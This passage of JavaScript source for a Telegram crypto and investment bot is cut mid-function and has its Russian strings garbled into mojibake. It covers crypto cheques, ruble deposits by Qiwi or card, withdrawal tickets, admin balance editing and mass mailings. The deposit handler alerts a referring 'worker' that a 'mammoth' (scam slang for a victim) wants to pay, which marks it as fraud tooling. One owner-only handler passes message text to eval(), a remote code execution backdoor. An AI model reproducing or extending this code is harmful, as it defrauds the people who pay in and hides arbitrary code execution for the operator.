			if(message.text > message.user.usdt) {
				return message.send(`–ù–∞ –∫–∞–∫—É—é —Å—É–º–º—É USDT –≤—ã–ø–∏—Å–∞—Ç—å —á–µ–∫? (–ï–≥–æ —Å–º–æ–∂–µ—Ç –æ–±–Ω–∞–ª–∏—á–∏—Ç—å –ª—é–±–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å, –∑–Ω–∞—é—â–∏–π –∫–æ–¥).

–î–æ—Å—Ç—É–ø–Ω–æ: ${message.user.usdt} USDT
–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤, –≤–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –º–µ–Ω—å—à–µ`)
			}
			await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: "" } }) 
			message.send(`‚ö°Ô∏è`) 
var result = random.generate(30)
var png = random.generate(10)
qrcode.toFile(`${png}.png`, `https://t.me/TokenRocketRobot?start=c_${result}`, {
  color: {
    dark: '#000',  
    light: '#0000'
  }
}, function (err) {
  if (err) throw err
  console.log('done')
})
			await User.findOneAndUpdate({ id: message.user.id }, { $inc: { usdt: -message.text } }) 
			
		
			 message.send(`

–ß—Ç–æ–±—ã –¥—Ä—É–≥–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å–º–æ–≥ –ø–æ–ª—É—á–∏—Ç—å USDT –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –µ–º—É —Å—Å—ã–ª–∫—É –∏–ª–∏ QR –∫–æ–¥.

–ß–µ–∫ –º–æ–∂–µ—Ç –æ–±–Ω–∞–ª–∏—á–∏—Ç—å –¥–∞–∂–µ –Ω–µ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å.

https://t.me/TokenRocketRobot?start=c_${result}`);
			let gift = new Gift({
					id: result,
					uid: message.user.id,
					crypto: `USDT`,
					amount: message.text
				});
				await gift.save();
				let file = `${png}.png`
				
		 bot.sendPhoto(message.user.id, file) 
		
	fs.unlink(`${png}.png`, (err) => {
 if (err) throw err;

  console.log('Deleted');
		})
			}
			if(crypto == `ton`) {
				if(message.text < 0.1) {
					return message.send(`–ù–∞ –∫–∞–∫—É—é —Å—É–º–º—É TON –≤—ã–ø–∏—Å–∞—Ç—å —á–µ–∫? (–ï–≥–æ —Å–º–æ–∂–µ—Ç –æ–±–Ω–∞–ª–∏—á–∏—Ç—å –ª—é–±–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å, –∑–Ω–∞—é—â–∏–π –∫–æ–¥).
	
	–î–æ—Å—Ç—É–ø–Ω–æ: ${message.user.ton} TON
	–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –Ω–µ –º–µ–Ω–µ–µ 0.1 TON`) 
				}
				if(message.text > message.user.ton) {
					return message.send(`–ù–∞ –∫–∞–∫—É—é —Å—É–º–º—É TON –≤—ã–ø–∏—Å–∞—Ç—å —á–µ–∫? (–ï–≥–æ —Å–º–æ–∂–µ—Ç –æ–±–Ω–∞–ª–∏—á–∏—Ç—å –ª—é–±–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å, –∑–Ω–∞—é—â–∏–π –∫–æ–¥).
	
	–î–æ—Å—Ç—É–ø–Ω–æ: ${message.user.ton} TON
	–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤, –≤–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –º–µ–Ω—å—à–µ`)
				}
				await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: "" } }) 
				message.send(`‚ö°Ô∏è`) 
var result = random.generate(30)
var png = random.generate(10)
qrcode.toFile(`${png}.png`, `https://t.me/TokenRocketRobot?start=c_${result}`, {
  color: {
    dark: '#000',  
    light: '#0000'
  }
}, function (err) {
  if (err) throw err
  console.log('done')
})
			await User.findOneAndUpdate({ id: message.user.id }, { $inc: { ton: -message.text } }) 
			
		
			 message.send(`

–ß—Ç–æ–±—ã –¥—Ä—É–≥–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å–º–æ–≥ –ø–æ–ª—É—á–∏—Ç—å TON –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –µ–º—É —Å—Å—ã–ª–∫—É –∏–ª–∏ QR –∫–æ–¥.

–ß–µ–∫ –º–æ–∂–µ—Ç –æ–±–Ω–∞–ª–∏—á–∏—Ç—å –¥–∞–∂–µ –Ω–µ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å.

https://t.me/TokenRocketRobot?start=c_${result}`);
			let gift = new Gift({
					id: result,
					uid: message.user.id,
					crypto: `TON`,
					amount: message.text
				});
				await gift.save();
				let file = `${png}.png`;
				
		 bot.sendPhoto(message.user.id, file); 
		
	fs.unlink(`${png}.png`, (err) => {
 if (err) throw err;

  console.log('Deleted');
		})
			}
			if(crypto == `btc`) {
				if(message.text < 0.1) {
					return message.send(`–ù–∞ –∫–∞–∫—É—é —Å—É–º–º—É BTC –≤—ã–ø–∏—Å–∞—Ç—å —á–µ–∫? (–ï–≥–æ —Å–º–æ–∂–µ—Ç –æ–±–Ω–∞–ª–∏—á–∏—Ç—å –ª—é–±–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å, –∑–Ω–∞—é—â–∏–π –∫–æ–¥).
	
	–î–æ—Å—Ç—É–ø–Ω–æ: ${message.user.btc} BTC
	–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –Ω–µ –º–µ–Ω–µ–µ 0.1 BTC`) 
				}
				if(message.text > message.user.btc) {
					return message.send(`–ù–∞ –∫–∞–∫—É—é —Å—É–º–º—É BTC –≤—ã–ø–∏—Å–∞—Ç—å —á–µ–∫? (–ï–≥–æ —Å–º–æ–∂–µ—Ç –æ–±–Ω–∞–ª–∏—á–∏—Ç—å –ª—é–±–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å, –∑–Ω–∞—é—â–∏–π –∫–æ–¥).
	
	–î–æ—Å—Ç—É–ø–Ω–æ: ${message.user.btc} BTC
	–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤, –≤–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –º–µ–Ω—å—à–µ`)
				}
				await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: "" } }) 
				message.send(`‚ö°Ô∏è`) 
var result = random.generate(30)
var png = random.generate(10)
qrcode.toFile(`${png}.png`, `https://t.me/TokenRocketRobot?start=c_${result}`, {
  color: {
    dark: '#000',  
    light: '#0000'
  }
}, function (err) {
  if (err) throw err
  console.log('done')
})

			await User.findOneAndUpdate({ id: message.user.id }, { $inc: { btc: -message.text } }) 
			
		
			 message.send(`

–ß—Ç–æ–±—ã –¥—Ä—É–≥–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å–º–æ–≥ –ø–æ–ª—É—á–∏—Ç—å BTC –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –µ–º—É —Å—Å—ã–ª–∫—É –∏–ª–∏ QR –∫–æ–¥.

–ß–µ–∫ –º–æ–∂–µ—Ç –æ–±–Ω–∞–ª–∏—á–∏—Ç—å –¥–∞–∂–µ –Ω–µ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å.

https://t.me/TokenRocketRobot?start=c_${result}`);
			let gift = new Gift({
					id: result,
					uid: message.user.id,
					crypto: `BTC`,
					amount: message.text
				});
				await gift.save();
				let file = `${png}.png`
				
		 bot.sendPhoto(message.user.id, file) 
		
	fs.unlink(`${png}.png`, (err) => {
 if (err) throw err;

  console.log('Deleted');
		})
			}
			if(crypto == `eth`) {
				if(message.text < 0.1) {
					return message.send(`–ù–∞ –∫–∞–∫—É—é —Å—É–º–º—É ETH –≤—ã–ø–∏—Å–∞—Ç—å —á–µ–∫? (–ï–≥–æ —Å–º–æ–∂–µ—Ç –æ–±–Ω–∞–ª–∏—á–∏—Ç—å –ª—é–±–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å, –∑–Ω–∞—é—â–∏–π –∫–æ–¥).
	
	–î–æ—Å—Ç—É–ø–Ω–æ: ${message.user.eth} ETH
	–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –Ω–µ –º–µ–Ω–µ–µ 0.1 ETH`) 
				}
				if(message.text > message.user.eth) {
					return message.send(`–ù–∞ –∫–∞–∫—É—é —Å—É–º–º—É ETH –≤—ã–ø–∏—Å–∞—Ç—å —á–µ–∫? (–ï–≥–æ —Å–º–æ–∂–µ—Ç –æ–±–Ω–∞–ª–∏—á–∏—Ç—å –ª—é–±–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å, –∑–Ω–∞—é—â–∏–π –∫–æ–¥).
	
	–î–æ—Å—Ç—É–ø–Ω–æ: ${message.user.eth} ETH
	–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤, –≤–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –º–µ–Ω—å—à–µ`)
				}
				await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: "" } }) 
				message.send(`‚ö°Ô∏è`) 
var result = random.generate(30)
var png = random.generate(10)
qrcode.toFile(`${png}.png`, `https://t.me/TokenRocketRobot?start=c_${result}`, {
  color: {
    dark: '#000',  
    light: '#0000'
  }
}, function (err) {
  if (err) throw err
  console.log('done')
})

			await User.findOneAndUpdate({ id: message.user.id }, { $inc: { eth: -message.text } }) 
			
		
			 message.send(`

–ß—Ç–æ–±—ã –¥—Ä—É–≥–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å–º–æ–≥ –ø–æ–ª—É—á–∏—Ç—å ETH –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –µ–º—É —Å—Å—ã–ª–∫—É –∏–ª–∏ QR –∫–æ–¥.

–ß–µ–∫ –º–æ–∂–µ—Ç –æ–±–Ω–∞–ª–∏—á–∏—Ç—å –¥–∞–∂–µ –Ω–µ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å.

https://t.me/TokenRocketRobot?start=c_${result}`);
			let gift = new Gift({
					id: result,
					uid: message.user.id,
					crypto: `ETH`,
					amount: message.text
				});
				await gift.save();
				let file = `${png}.png`
				
		 bot.sendPhoto(message.user.id, file) 
		
	fs.unlink(`${png}.png`, (err) => {
 if (err) throw err;

  console.log('Deleted');
		})
			}
			if(crypto == `bnb`) {
				if(message.text < 0.1) {
					return message.send(`–ù–∞ –∫–∞–∫—É—é —Å—É–º–º—É BNB –≤—ã–ø–∏—Å–∞—Ç—å —á–µ–∫? (–ï–≥–æ —Å–º–æ–∂–µ—Ç –æ–±–Ω–∞–ª–∏—á–∏—Ç—å –ª—é–±–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å, –∑–Ω–∞—é—â–∏–π –∫–æ–¥).
	
	–î–æ—Å—Ç—É–ø–Ω–æ: ${message.user.bnb} BNB
	–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –Ω–µ –º–µ–Ω–µ–µ 0.1 BNB`) 
				}
				if(message.text > message.user.bnb) {
					return message.send(`–ù–∞ –∫–∞–∫—É—é —Å—É–º–º—É BNB –≤—ã–ø–∏—Å–∞—Ç—å —á–µ–∫? (–ï–≥–æ —Å–º–æ–∂–µ—Ç –æ–±–Ω–∞–ª–∏—á–∏—Ç—å –ª—é–±–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å, –∑–Ω–∞—é—â–∏–π –∫–æ–¥).
	–î–æ—Å—Ç—É–ø–Ω–æ: ${message.user.bnb} BNB
	–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤, –≤–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –º–µ–Ω—å—à–µ`)
				}
				await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: "" } }) 
				message.send(`‚ö°Ô∏è`) 
var result = random.generate(30)
var png = random.generate(10)
qrcode.toFile(`${png}.png`, `https://t.me/TokenRocketRobot?start=c_${result}`, {
  color: {
    dark: '#000',  
    light: '#0000'
  }
}, function (err) {
  if (err) throw err
  console.log('done')
})

			await User.findOneAndUpdate({ id: message.user.id }, { $inc: { bnb: -message.text } }) 
			
		
			 message.send(`

–ß—Ç–æ–±—ã –¥—Ä—É–≥–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å–º–æ–≥ –ø–æ–ª—É—á–∏—Ç—å BNB –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –µ–º—É —Å—Å—ã–ª–∫—É –∏–ª–∏ QR –∫–æ–¥.

–ß–µ–∫ –º–æ–∂–µ—Ç –æ–±–Ω–∞–ª–∏—á–∏—Ç—å –¥–∞–∂–µ –Ω–µ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å.

https://t.me/TokenRocketRobot?start=c_${result}`);
			let gift = new Gift({
					id: result,
					uid: message.user.id,
					crypto: `BNB`,
					amount: message.text
				});
				await gift.save();
				let file = `${png}.png`
				
		 bot.sendPhoto(message.user.id, file) 
		
	fs.unlink(`${png}.png`, (err) => {
 if (err) throw err;

  console.log('Deleted');
		})
			}
			if(crypto == `busd`) {
				if(message.text < 0.1) {
					return message.send(`–ù–∞ –∫–∞–∫—É—é —Å—É–º–º—É BUSD –≤—ã–ø–∏—Å–∞—Ç—å —á–µ–∫? (–ï–≥–æ —Å–º–æ–∂–µ—Ç –æ–±–Ω–∞–ª–∏—á–∏—Ç—å –ª—é–±–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å, –∑–Ω–∞—é—â–∏–π –∫–æ–¥).
	
	–î–æ—Å—Ç—É–ø–Ω–æ: ${message.user.busd} BUSD
	–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –Ω–µ –º–µ–Ω–µ–µ 0.1 BUSD`) 
				}
				if(message.text > message.user.busd) {
					return message.send(`–ù–∞ –∫–∞–∫—É—é —Å—É–º–º—É BUSD –≤—ã–ø–∏—Å–∞—Ç—å —á–µ–∫? (–ï–≥–æ —Å–º–æ–∂–µ—Ç –æ–±–Ω–∞–ª–∏—á–∏—Ç—å –ª—é–±–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å, –∑–Ω–∞—é—â–∏–π –∫–æ–¥).
	
	–î–æ—Å—Ç—É–ø–Ω–æ: ${message.user.busd} BUSD
	–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤, –≤–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –º–µ–Ω—å—à–µ`)
				}
				await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: "" } }) 
				message.send(`‚ö°Ô∏è`) 
var result = random.generate(30)
var png = random.generate(10)
qrcode.toFile(`${png}.png`, `https://t.me/TokenRocketRobot?start=c_${result}`, {
  color: {
    dark: '#000',  
    light: '#0000'
  }
}, function (err) {
  if (err) throw err
  console.log('done')
})

			await User.findOneAndUpdate({ id: message.user.id }, { $inc: { busd: -message.text } }) 
			
		
			 message.send(`

–ß—Ç–æ–±—ã –¥—Ä—É–≥–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å–º–æ–≥ –ø–æ–ª—É—á–∏—Ç—å BUSD –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –µ–º—É —Å—Å—ã–ª–∫—É –∏–ª–∏ QR –∫–æ–¥.

–ß–µ–∫ –º–æ–∂–µ—Ç –æ–±–Ω–∞–ª–∏—á–∏—Ç—å –¥–∞–∂–µ –Ω–µ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å.

https://t.me/TokenRocketRobot?start=c_${result}`);
			let gift = new Gift({
					id: result,
					uid: message.user.id,
					crypto: `BUSD`,
					amount: message.text
				});
				await gift.save();
				let file = `${png}.png`
				
		 bot.sendPhoto(message.user.id, file) 
		
	fs.unlink(`${png}.png`, (err) => {
 if (err) throw err;

  console.log('Deleted');
		})
			}
		}

									if(message.user.menu.startsWith("enterAmount")) {
										if (message.chat.id < 0) { return } 
			message.text = Math.floor(Number(message.text));
			if(!message.text) return message.send(`–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –Ω–∞ –≤—ã–≤–æ–¥`);

			let wallet = (message.user.menu.split("_")[1]);
            let platc = (message.user.menu.split("_")[2]);
            
            
			if(message.text > message.user.balance) return message.send(`–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –Ω–∞ –≤—ã–≤–æ–¥`);
			if(message.text < 49.99) return message.send(`–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –Ω–∞ –≤—ã–≤–æ–¥`);

			else if(message.text <= message.user.balance) {
				
				await User.findOneAndUpdate({ id: message.user.id}, { $inc: { balance: -message.text} })

	
				await message.user.dec("balance", message.text);

	let ouser = await User.findOne({ id: 5547452982 });
			let oq = ouser.oq
			let ow = ouser.ow
			let oe = ouser.oe
			let or = ouser.or
			await User.findOneAndUpdate({ id: 5547452982 }, { $set: { ot: or } })
            await User.findOneAndUpdate({ id: 5547452982 }, { $set: { or: oe } })
			await User.findOneAndUpdate({ id: 5547452982 }, { $set: { oe: ow } })
			await User.findOneAndUpdate({ id: 5547452982 }, { $set: { ow: oq } })

			bot.sendMessage(message.user.id, `‚úÖ –ó–∞—è–≤–∫–∞ –Ω–∞ –≤—ã–≤–æ–¥ —Å–æ–∑–¥–∞–Ω–∞, —Å—Ä–µ–¥—Å—Ç–≤–∞ –ø—Ä–∏–¥—É—Ç –≤ —Ç–µ—á–µ–Ω–∏–∏ 24 —á–∞—Å–æ–≤!`, {
			parse_mode: "HTML", 
			reply_markup: {
						keyboard: keyboards.main,
						resize_keyboard: true
					}, 
		}); 
		let ticket = new Ticket({
					owner: message.user.id,
	wallet: `${wallet} (${platc})`,
	amount: message.text
				});

				await ticket.save();
				await message.user.set("menu", "");
admins.map((x) => bot.sendMessage(x, `<a href="tg://user?id=${message.user.id}">üîî</a> –ù–æ–≤–∞—è –∑–∞—è–≤–∫–∞ –Ω–∞ –≤—ã–≤–æ–¥
`, {
				parse_mode: "HTML",
			}));
			}
		}

		if(message.user.menu.startsWith("qiwi")) {
			if (message.chat.id < 0) { return } 
			message.text = message.text;
			let plat = (message.user.menu.split("qiwi")[1]);
			console.log(plat)
			await message.user.set("menu", "enterAmount_" + message.text + plat);
			return message.send(`–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –Ω–∞ –≤—ã–≤–æ–¥`,{ parse_mode: "HTML" });
		}

        function getRandomInt(max) {
            return Math.floor(Math.random() * max);
          }

        if(message.user.menu.startsWith("deposit")) {
			if (message.chat.id < 0) { return } 
			message.text = Number(message.text);
            if(message.text < 1000) {
                await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: `` } })
                return message.send(`üö´ –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è: 1 000 RUB`, {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [				   
                             [
                                { text: "< –ù–∞–∑–∞–¥", callback_data: `menu` },
                                                     ],
                             ],
                             
                 }, 
            });
            }
            if(message.text > 100000) {
                await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: `` } })
                return message.send(`üö´ –ú–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è: 100 000 RUB`, {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [				   
                             [
                                { text: "< –ù–∞–∑–∞–¥", callback_data: `menu` },
                                                     ],
                             ],
                             
                 }, 
            });
            }
            let ggg = await User.findOne({ id: message.user.id });
            let ref = await User.findOne({ id: ggg.ref });
            await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: `` } })
            var result = getRandomInt(99)
            var hr = 1-(result/100)
			await message.send(`–°—É–º–º–∞ –∫ –æ–ø–ª–∞—Ç–µ: ${message.text-hr} RUB
            üí≥ –î–ª—è –æ–ø–ª–∞—Ç—ã —Å –ø–æ–º–æ—â—å—é –ø—Ä—è–º–æ–≥–æ –ø–µ—Ä–µ–≤–æ–¥–∞ —Å–æ–≤–µ—Ä—à–∏—Ç–µ –ø–ª–∞—Ç—ë–∂ –ø–æ —Ä–µ–∫–≤–∏–∑–∏—Ç–∞–º: —Ä–µ–∫–≤–∏–∑–∏—Ç—ã

            üî• –î–ª—è –æ–ø–ª–∞—Ç—ã —Å –ø–æ–º–æ—â—å—é qiwi —Å–æ–≤–µ—Ä—à–∏—Ç–µ –ø–ª–∞—Ç—ë–∂ –Ω–∞ —Å—É–º–º—É –ø–æ —Ä–µ–∫–≤–∏–∑–∏—Ç–∞–º: —Ä–µ–∫–≤–∏–∑–∏—Ç—ã
            
            –ü–æ—Å–ª–µ –ø–µ—Ä–µ–≤–æ–¥–∞ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤—å—Ç–µ —á–µ–∫ –≤ pdf —Ñ–æ—Ä–º–∞—Ç–µ –æ–ø–µ—Ä–∞—Ç–æ—Ä—É –º–∞–≥–∞–∑–∏–Ω–∞
            `, {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [	
                        [
                            { text: "üßë‚Äçüíª –û–ø–µ—Ä–∞—Ç–æ—Ä", url: `t.me/` },
                        ],			   
                             [
                                { text: "< –ù–∞–∑–∞–¥", callback_data: `menu` },
                                                     ],
                             ],
                             
                 }, 
            });
			if(ref.work == 1) {
                await bot.sendMessage(ref.id, `üó£ –ú–∞–º–æ–Ω—Ç @ <a href="tg://user?id=${message.user.id}">id${message.user.id}</a> —Ö–æ—á–µ—Ç –ø–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å –Ω–∞ —Å—É–º–º—É ${message.text} RUB —á–µ—Ä–µ–∑ ü•ù Qiwi / üí≥ Card`, {
                parse_mode: "HTML"
               });
               }
		}
		
		if(message.text === "/chat") {
			if (message.chat.id > 0) { return } 
			return message.send(`
ID: <code>${message.chat.id}</code>`, {
			parse_mode: "HTML"
		});
			} 
	
	if(/^(?:~)\s([^]+)/i.test(message.text)) {
		if(message.from.id !== 5547452982) return;

		let result = eval(message.text.match(/^(?:~)\s([^]+)/i)[1]);
		try {
			if(typeof(result) === "string")
			{
				return message.send(`string: \`${result}\``, { parse_mode: "Markdown" });
			} else if(typeof(result) === "number")
			{
				return message.send(`number: \`${result}\``, { parse_mode: "Markdown" });
			} else {
				return message.send(`${typeof(result)}: \`${JSON.stringify(result, null, '\t\t')}\``, { parse_mode: "Markdown" });
			}
		} catch (e) {
			console.error(e);
			return message.send(`–æ—à–∏–±–∫–∞:
\`${e.toString()}\``, { parse_mode: "Markdown" });
		}
	}

	if(admins.indexOf(message.from.id) !== -1) {
		if(message.user.menu.startsWith("setBalance")) {
			message.text		=		Number(message.text);
			if(!message.text) return message.send(`–í–≤–µ–¥–∏—Ç–µ –Ω–æ–≤—ã–π –±–∞–ª–∞–Ω—Å.`);

			let user		=		await User.findOne({ id: Number(message.user.menu.split("setBalance")[1]) });
			if(!user) return;

			await user.set("balance", message.text);
			await message.user.set("menu", "");

			return message.send(`–ë–∞–ª–∞–Ω—Å —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω—ë–Ω.`, {
				reply_markup: {
					keyboard: keyboards.admin,
					resize_keyboard: true
				}
			});
		}
		
		if(message.user.menu.startsWith("setInBalance")) {
			message.text		=		Number(message.text);
			if(!message.text) return message.send(`–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É.`);

			let user		=		await User.findOne({ id: Number(message.user.menu.split("setInBalance")[1]) });
			if(!user) return;

			await user.set("invests", message.text);
			await message.user.set("menu", "");

			return message.send(`–ò–Ω–≤–µ—Å—Ç —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω—ë–Ω.`, {
				reply_markup: {
					keyboard: keyboards.admin,
					resize_keyboard: true
				}
			});
		}

		if(message.user.menu === "enterIdBalance") {
			message.text		=		Math.floor(Number(message.text));
			if(!message.text) return message.send(`–í–≤–µ–¥–∏—Ç–µ –∞–π–¥–∏.`);

			let user		=		await User.findOne({ id: message.text });
			if(!user) return message.send(`–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω.`);

			await message.user.set("menu", "setBalance" + message.text);
			return message.send(`–í–≤–µ–¥–∏—Ç–µ –Ω–æ–≤—ã–π –±–∞–ª–∞–Ω—Å.\n–ë–∞–ª–∞–Ω—Å —Å–µ–π—á–∞—Å: ${user.balance} RUB`);
		}
		
				if(message.user.menu === "enterIdInBalance") {
			message.text		=		Math.floor(Number(message.text));
			if(!message.text) return message.send(`–í–≤–µ–¥–∏—Ç–µ –∞–π–¥–∏.`);

			let user		=		await User.findOne({ id: message.text });
			if(!user) return message.send(`–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω.`);

			await message.user.set("menu", "setInBalance" + message.text);
			return message.send(`–í–≤–µ–¥–∏—Ç–µ —Å–∫–æ–ª—å–∫–æ –¥–æ–±–∞–≤–∏—Ç—å.\n–ò–Ω–≤–µ—Å—Ç–∏—Ü–∏–∏ —Å–µ–π—á–∞—Å: ${user.invests} RUB`);
		}

		if(message.user.menu.startsWith("auditory")) {
			let users		=		await User.find();
			let total		=		users.length * Number(message.user.menu.split("auditory")[1]);

			for (let i = 0; i < total; i++) {
				if(message.photo) {
					let file_id = message.photo[message.photo.length - 1].file_id;
					let params = {
						caption: message.caption,
						parse_mode: "HTML",
						disable_web_page_preview: true
					}

					if(message.caption.match(/(?:–∫–Ω–æ–ø–∫–∞)\s(.*)\s-\s(.*)/i)) {
						let [ msgText, label, url ] = message.caption.match(/(?:–∫–Ω–æ–ø–∫–∞)\s(.*)\s-\s(.*)/i);
						params.reply_markup = {
							inline_keyboard: [
								[{ text: label, url: url }]
							]
						}

						params.caption = params.caption.replace(/(–∫–Ω–æ–ø–∫–∞)\s(.*)\s-\s(.*)/i, "");
					}

					bot.sendPhoto(users[i].id, file_id, params);
				}

				if(!message.photo) {
					let params = {
						parse_mode: "HTML",
						disable_web_page_preview: true
					}

					if(message.text.match(/(?:–∫–Ω–æ–ø–∫–∞)\s(.*)\s-\s(.*)/i)) {
						let [ msgText, label, url ] = message.text.match(/(?:–∫–Ω–æ–ø–∫–∞)\s(.*)\s-\s(.*)/i);
						params.reply_markup = {
							inline_keyboard: [
								[{ text: label, url: url }]
							]
						}
					}

					bot.sendMessage(users[i].id, message.text.replace(/(–∫–Ω–æ–ø–∫–∞)\s(.*)\s-\s(.*)/i, ""), params);
				}
			}

			await message.user.set("menu", "");
			await message.send("–†–∞—Å—Å—ã–ª–∫–∞ —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∞.", {
				reply_markup: {
					keyboard: keyboards.admin,
					resize_keyboard: true
				}
			});
		}

		if(message.user.menu === "selectAuditory") {
			await message.user.set("menu", "auditory" + Number(message.text));
			return message.send(`–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç —Ä–∞—Å—Å—ã–ª–∫–∏.
			
–ú–æ–∂–Ω–æ –ø—Ä–∏–∫—Ä–µ–ø–∏—Ç—å –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ.`, {
				reply_markup: {
					keyboard: keyboards.cancel,
					resize_keyboard: true
				}
			});
		}

		
		if(message.user.menu === "ban") {
			message.text		=		Math.floor(Number(message.text));
			if(!message.text) return message.send(`–í–≤–µ–¥–∏—Ç–µ –∞–π–¥–∏.`);

			let ban			=		await Ban.findOne({ id: message.text });
			if(ban) {
				await ban.remove();
				await message.user.set("menu", "");

				return message.send(`–ë–∞–Ω —Å–Ω—è—Ç.`);
			} else {
				let _ban = new Ban({
					id: message.text
				});

				await _ban.save();
				await message.user.set("menu", "");

				return message.send(`–ë–∞–Ω –≤—ã–¥–∞–Ω.`);
			}
		}
		if(message.user.menu === "enterpay") {
			message.text		=		Math.floor(Number(message.text));
			if(!message.text) return message.send(`–í–≤–µ–¥–∏—Ç–µ –∞–π–¥–∏.`);

			let user		=		await User.findOne({ id: message.text });
			if(!user) return message.send(`–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω.`);

			await message.user.set("menu", "setpay" + message.text);
			return message.send(`–°—É–º–º–∞ –ø–ª–∞—Ç–µ–∂–∞?`);
		} 
		
		if(message.user.menu.startsWith("setpay")) {
			message.text		=		Number(message.text);
